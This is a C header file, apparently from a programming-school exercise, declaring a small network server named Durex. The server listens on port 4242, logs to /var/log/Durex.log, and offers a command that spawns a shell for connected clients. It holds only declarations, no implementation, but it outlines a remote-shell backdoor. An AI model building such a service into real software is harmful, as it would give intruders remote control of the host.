/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:16:36 by root              #+#    #+#             */
/*   Updated: 2018/07/20 17:41:14 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

/* memset strcpy */
# include <string.h>
/* select */
# include <sys/time.h>
# include <sys/types.h>
# include <unistd.h>

# define SERVER_REPORTER	"/var/log/Durex.log"
# define SERVER_ADDR		"localhost"
# define SERVER_PORT		"4242"
# define SERVER_CLIENT_MAX	3
# define SERVER_CLIENT_BUFF	128
# define SERVER_COMMANDS	"help", "shell", "quit"
# define SERVER_HELP		"display this help", "spawn a shell", "quit server"
# define SERVER_FUNCTIONS	&serverHelp, &serverShell, &serverQuitClient

typedef struct	s_buff
{
	char		buff[SERVER_CLIENT_BUFF];
	char		*head;
	char		*tail;
}				t_buff;

typedef struct	s_cl
{
	int			fd;
	int			logged;
	int			shell;
	t_buff		rd;
	t_buff		wr;
}				t_cl;

typedef struct	s_sv
{
	int			reporter;
	int			fd;
	fd_set		fdr;
	fd_set		fdw;
	t_cl		client[SERVER_CLIENT_MAX];
}				t_sv;

int				openServer(const char *addr, const char *port);
void			serverAcceptConnections();
void			serverReadClient(t_cl *client);
void			serverWriteClient(t_cl *client);
void			serverHelp(t_cl *client);
void			serverShell(t_cl *client);
void			serverQuitClient(t_cl *client);
void			quitClearlyServer();
void			clearClient(t_cl *client);
void			serverShellSpawned(char *buff, t_cl *client);

void			clientRead(char *buff, int size, t_cl *client);
void			clientWrite(char *str, t_cl *client);

void			encrypt(u_char *msg, size_t size);
void			reporterLog();
char			*moveTail(char *ptr, char *buff, int buff_size);

#endif /* DUREX_H */
